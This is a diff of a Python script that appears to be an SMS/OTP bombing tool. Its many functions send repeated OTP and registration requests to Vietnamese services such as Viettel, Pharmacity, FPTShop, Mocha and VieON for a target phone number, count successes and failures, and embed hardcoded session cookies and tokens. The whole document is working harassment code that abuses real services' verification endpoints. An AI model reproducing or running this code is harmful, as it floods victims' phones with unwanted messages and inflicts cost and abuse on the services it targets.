-    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
-    Params = {"platform": "mobile_web","ui": "012021"}
-    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
-    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers, timeout=30, verify=False)
-    if response.status_code == 200:
-        thanhcong+=1
-    else:
-        thatbai+=1
-#sms 16
-def sms11(phone):
-    global thanhcong
-    global thatbai
-    cookies = {
-        'PHPSESSID': 'j7jhajmp8628ho9d98bckrhkog',
-        '6f1eb01ca7fb61e4f6882c1dc816f22d': 'T%2FEqzjRRd5g%3D9wbPAi8i%2BPE%3DkUojPvEevkU%3DU%2B08xInuNgU%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3DXm3ctRf7oxM%3D9alt4piEgqQ%3DQ7x721%2FEaGg%3DuZW0GQvziBc%3D8oFXwkEqKzc%3DShKWTapcW5U%3D',
-        '_ga': 'GA1.1.1223576462.1703858206',
-        '__utma': '65249340.1223576462.1703858206.1703858250.1703858250.1',
-        '__utmc': '65249340',
-        '__utmz': '65249340.1703858250.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
-        '__utmt': '1',
-        '_gcl_au': '1.1.854737399.1703858251',
-        '_ga_DFG3FWNPBM': 'GS1.1.1703858205.1.1.1703858365.60.0.0',
-        '__utmb': '65249340.2.10.1703858250',
-        '__admUTMtime': '1703858368',
-        '_tt_enable_cookie': '1',
-        '_ttp': 'FLrVXJT5FMP_B9az47LH6-P6_GD',
-        '_ga_BBD6001M29': 'GS1.1.1703858371.1.0.1703858371.60.0.0',
-        '_fbp': 'fb.1.1703858371624.505444992',
-        'dtdz': '39b60b4b-5c1c-40f7-a1fa-1775072dd497',
-        '__iid': '',
-        '__iid': '',
-        '__su': '0',
-        '__su': '0',
-        'Srv': 'cc204|ZY7Qz|ZY7QH',
-    }
-
-    headers = {
-        'authority': 'concung.com',
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        # 'cookie': 'PHPSESSID=j7jhajmp8628ho9d98bckrhkog; 6f1eb01ca7fb61e4f6882c1dc816f22d=T%2FEqzjRRd5g%3D9wbPAi8i%2BPE%3DkUojPvEevkU%3DU%2B08xInuNgU%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3DXm3ctRf7oxM%3D9alt4piEgqQ%3DQ7x721%2FEaGg%3DuZW0GQvziBc%3D8oFXwkEqKzc%3DShKWTapcW5U%3D; _ga=GA1.1.1223576462.1703858206; __utma=65249340.1223576462.1703858206.1703858250.1703858250.1; __utmc=65249340; __utmz=65249340.1703858250.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; _gcl_au=1.1.854737399.1703858251; _ga_DFG3FWNPBM=GS1.1.1703858205.1.1.1703858365.60.0.0; __utmb=65249340.2.10.1703858250; __admUTMtime=1703858368; _tt_enable_cookie=1; _ttp=FLrVXJT5FMP_B9az47LH6-P6_GD; _ga_BBD6001M29=GS1.1.1703858371.1.0.1703858371.60.0.0; _fbp=fb.1.1703858371624.505444992; dtdz=39b60b4b-5c1c-40f7-a1fa-1775072dd497; __iid=; __iid=; __su=0; __su=0; Srv=cc204|ZY7Qz|ZY7QH',
-        'dnt': '1',
-        'origin': 'https://concung.com',
-        'referer': 'https://concung.com/dang-nhap.html',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    data = {
-        'ajax': '1',
-        'classAjax': 'AjaxLogin',
-        'methodAjax': 'sendOtpLogin',
-        'customer_phone': phone,
-        'statictoken': 'e633865a31fa27f35b8499e1a75b0a76',
-        'captcha_key': '9a1b5162bfa438e4ead921afe49cc8d3',
-        'id_customer': '0',
-    }
-
-    response = requests.post('https://concung.com/ajax.html?sendOtpLogin', cookies=cookies, headers=headers, data=data, timeout=30, verify=False)
-    if response.status_code == 200:
-        thanhcong+=1
-    else:
-        thatbai+=1
-
-#sms 24
-def sms12(phone):
-    global thanhcong
-    cookies = {
-        '_ga': 'GA1.1.2087670331.1693621115',
-        'ajs_anonymous_id': 'f03d6d9e-8b96-4989-85e4-4a2f1aa5804d',
-        'ApplicationGatewayAffinityCORS': 'e3a3e7f76978c3189d076edb90ce010d',
-        'ApplicationGatewayAffinity': 'e3a3e7f76978c3189d076edb90ce010d',
-        '_ga_05MHVHMYGR': 'GS1.1.1693621114.1.1.1693621123.0.0.0',
-    }
-
-    headers = {
-        'authority': 'topenland.com',
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        # 'cookie': '_ga=GA1.1.2087670331.1693621115; ajs_anonymous_id=f03d6d9e-8b96-4989-85e4-4a2f1aa5804d; ApplicationGatewayAffinityCORS=e3a3e7f76978c3189d076edb90ce010d; ApplicationGatewayAffinity=e3a3e7f76978c3189d076edb90ce010d; _ga_05MHVHMYGR=GS1.1.1693621114.1.1.1693621123.0.0.0',
-        'dnt': '1',
-        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    }
-
-    params = {
-        'phoneNumber': phone,
-    }
-
-    response = requests.get(
-        'https://topenland.com/_next/data/VL6b140TPQ9AMHJ2DqgBU/vi/sign-up/verify-otp.json',
+        response = requests.get(
+        'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
         params=params,
         cookies=cookies,
         headers=headers,
     )
+        hoanthanh("BATDONGSAN", phone)
+    except:
+        error("BATDONGSAN", phone)
+def dvcd(phone):
+    try:
+        cookies = {
+            'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
+            '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
+            'redirectLogin': 'https://viettel.vn/dang-ky',
+            'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
+        }
 
-    thanhcong+=1
-#sms 25
-def sms13(phone):
-    global thanhcong
-    global thatbai
-    headers = {'authority': 'api-gateway.pharmacity.vn','accept': '*/*','accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','content-type': 'application/json','dnt': '1','origin': 'https://www.pharmacity.vn','referer': 'https://www.pharmacity.vn/','sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',}
-    json_data = {'phone': phone,'referral': '',}
-    response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers, json=json_data, timeout=30, verify=False)
-    if 'success' in response.text:
-        thanhcong+=1
-    else:
-        thatbai+=1
-#sms 26
-def sms14(phone):
-    global thanhcong
-    global thatbai
-    headers = {
+        headers = {
+    
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/json;charset=UTF-8',
+            # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
+            'Origin': 'https://viettel.vn',
+            'Referer': 'https://viettel.vn/dang-ky',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
+            'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
+            'X-Requested-With': 'XMLHttpRequest',
+            'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
+            'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+        }
+
+        json_data = {
+            'msisdn': phone,
+        }
+
+        response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
+        hoanthanh("VIETTEL", phone)
+    except:
+        error("VIETTEL", phone)
+def myvt(phone):
+    try:
+        cookies = {
+            'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF',
+            '__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1',
+            'XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
+        }
+
+        headers = {
+    
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/json;charset=UTF-8',
+            'Cookie': 'laravel_session=5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF; __zi=3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1; XSRF-TOKEN=eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
+            'DNT': '1',
+            'Origin': 'https://viettel.vn',
+            'Referer': 'https://viettel.vn/dang-nhap',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+            'X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i',
+            'X-Requested-With': 'XMLHttpRequest',
+            'X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=',
+            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+        }
+
+        json_data = {
+            'phone': phone,
+            'type': '',
+        }
+
+        response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)
+        hoanthanh("VIETTEL 2", phone)
+    except:
+        error("VIETTEL 2", phone)
+def phar(phone):
+    try:
+        headers = {
+    
+            'authority': 'data-service.pharmacity.io',
+            'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
+            'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+            'dnt': '1',
+            'referer': 'https://www.pharmacity.vn/',
+            'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'image',
+            'sec-fetch-mode': 'no-cors',
+            'sec-fetch-site': 'cross-site',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
+        }
+
+        response = requests.get(
+            'https://data-service.pharmacity.io/pmc-ecm-webapp-config-api/production/banner/654%20x%20324-1684304235294.png',
+            headers=headers,
+        )
+
+
+        headers = {
+            'authority': 'api-gateway.pharmacity.vn',
+            'accept': '*/*',
+            'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+            'access-control-request-headers': 'content-type',
+            'access-control-request-method': 'POST',
+            'origin': 'https://www.pharmacity.vn',
+            'referer': 'https://www.pharmacity.vn/',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
+        }
+
+        response = requests.options('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers)
+
+
+        headers = {
+            'authority': 'api-gateway.pharmacity.vn',
+            'accept': '*/*',
+            'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+            'content-type': 'application/json',
+            'dnt': '1',
+            'origin': 'https://www.pharmacity.vn',
+            'referer': 'https://www.pharmacity.vn/',
+            'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
+        }
+
+        json_data = {
+            'phone': phone,
+            'referral': '',
+        }
+
+        response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers, json=json_data)
+        hoanthanh("PHARMACITY", phone)
+    except:
+        error("PHARMACITY", phone)
+def one(phone):
+    try:
+        headers = {
+
         'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
+        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'Cache-Control': 'no-cache',
         'Connection': 'keep-alive',
         # 'Content-Length': '0',
-        'DNT': '1',
         'Origin': 'https://video.mocha.com.vn',
+        'Pragma': 'no-cache',
         'Referer': 'https://video.mocha.com.vn/',
         'Sec-Fetch-Dest': 'empty',
         'Sec-Fetch-Mode': 'cors',
         'Sec-Fetch-Site': 'same-site',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
     }
 
-    params = {
+        params = {
         'msisdn': phone,
         'languageCode': 'vi',
     }
 
-    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers, timeout=30, verify=False)
-    if '200' in response.text:
-        thanhcong+=1
-    else:
-        thatbai+=1
+        response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
+        hoanthanh("MOCHA", phone)
+    except:
+        error("MOCHA", phone)
+def fptshop(phone):
+    try:
+        headers = {
 
-#sms 32
-def sms15(phone):
-    global thanhcong
-    global thatbai
-    headers = {
-        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
-        'Connection': 'keep-alive',
-        'DNT': '1',
-        'Origin': 'https://best-inc.vn',
-        'Referer': 'https://best-inc.vn/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'cross-site',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-        'accept': 'application/json',
-        'authorization': 'null',
+        'accept': '*/*',
+        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
+        'cache-control': 'no-cache',
         'content-type': 'application/json',
-        'lang-type': 'vi-VN',
-        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'x-auth-type': 'WEB',
-        'x-lan': 'VI',
-        'x-nat': 'vi-VN',
-        'x-timezone-offset': '7',
+        'order-channel': '1',
+        'origin': 'https://fptshop.com.vn',
+        'pragma': 'no-cache',
+        'priority': 'u=1, i',
+        'referer': 'https://fptshop.com.vn/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
     }
 
-    json_data = {
+        json_data = {
+        'fromSys': 'WEBKHICT',
+        'otpType': '0',
         'phoneNumber': phone,
-        'verificationCodeType': 1,
     }
 
-    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data, timeout=30, verify=False)
-    if '"status":true' in response.text:
-        thanhcong+=1
-    else:
-        thatbai+=1
-#sms 33
+        response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
+        hoanthanh("FPTSHOP", phone)
+    except:
+        error("FPTSHOP", phone)
+def meta(phone):
+    try:
+        cookies = {
+        '_ssid': 'vhs1wox2wourjpxsr55hygiu',
+        '_cart_': '50568886-ac95-4d4b-b7e3-7819d23d7e44',
+        '_gcl_au': '1.1.1853648441.1720104054',
+        '__ckmid': '533492a097c04aa18d6dc2d81118d705',
+        '_gid': 'GA1.2.95221250.1720104055',
+        '_gat_UA-1035222-8': '1',
+        '_ga': 'GA1.1.172471248.1720104055',
+        '.mlc': 'eyJjaXR5IjoiQ+AgTWF1IiwiY291bnRyeSI6IlZOIn0=',
+        '_clck': 'lpzudx%7C2%7Cfn6%7C0%7C1646',
+        '_clsk': '1j3awjd%7C1720104063602%7C1%7C1%7Cu.clarity.ms%2Fcollect',
+        '_ga_YE9QV6GZ0S': 'GS1.1.1720104062.1.1.1720104068.0.0.0',
+        '_ga_L0FCVV58XQ': 'GS1.1.1720104056.1.1.1720104070.46.0.0',
+    }
 
-#sms 34
-def sms17(phone):
-    global thanhcong
-    global thatbai
-    headers = {
-        'authority': 'v3.meeyid.com',
-        'accept': '*/*',
-        'accept-language': 'vi-VN',
+        headers = {
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'cache-control': 'no-cache',
         'content-type': 'application/json',
-        'dnt': '1',
-        'origin': 'https://meeyid.com',
-        'referer': 'https://meeyid.com/',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        # 'cookie': '_ssid=vhs1wox2wourjpxsr55hygiu; _cart_=50568886-ac95-4d4b-b7e3-7819d23d7e44; _gcl_au=1.1.1853648441.1720104054; __ckmid=533492a097c04aa18d6dc2d81118d705; _gid=GA1.2.95221250.1720104055; _gat_UA-1035222-8=1; _ga=GA1.1.172471248.1720104055; .mlc=eyJjaXR5IjoiQ+AgTWF1IiwiY291bnRyeSI6IlZOIn0=; _clck=lpzudx%7C2%7Cfn6%7C0%7C1646; _clsk=1j3awjd%7C1720104063602%7C1%7C1%7Cu.clarity.ms%2Fcollect; _ga_YE9QV6GZ0S=GS1.1.1720104062.1.1.1720104068.0.0.0; _ga_L0FCVV58XQ=GS1.1.1720104056.1.1.1720104070.46.0.0',
+        'origin': 'https://meta.vn',
+        'pragma': 'no-cache',
+        'priority': 'u=1, i',
+        'referer': 'https://meta.vn/account/register',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'x-affilate-id': 'www.google.com',
-        'x-browser-id': 'undefined',
-        'x-client-id': 'meeyid',
-        'x-partner-id': '',
-        'x-time': '1703859585701',
-        'x-token': 'MHgmvk9zRhqTcwMzg1OTU4NTcwMLJAC3S5jaUtJeFVNbklFQ2dsaHJwR0RvRGpqb055cG9sWEtzeEpWU23fN9RxHZkd5QlRORERiVXV3ekx3ZAmz1br1bbVMDvwcElNRGVEdEhES2Z4WU5wLjQyMDI0ZmYzYzJkZDcwZWEzYTQ5ODM3YjRkOWU1MjA3',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
     }
 
-    json_data = {
-        'phone': phone,
-        'phoneCode': '+84',
-        'refCode': '',
+        params = {
+        'api_mode': '1',
     }
 
-    response = requests.post('https://v3.meeyid.com/auth/v4.1/register-with-phone', headers=headers, json=json_data, timeout=30, verify=False)
-    if '"status":true' in response.text:
-        thanhcong+=1
-    else:
-        thatbai+=1
-#sms 35
-def sms18(phone):
-    global thanhcong
-    global thatbai
-    headers = {
-        'authority': 'api.onelife.vn',
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        'authorization': '',
-        'content-type': 'application/json',
-        'dnt': '1',
-        'domain': 'kingfoodmart',
-        'origin': 'https://kingfoodmart.com',
-        'referer': 'https://kingfoodmart.com/',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'cross-site',
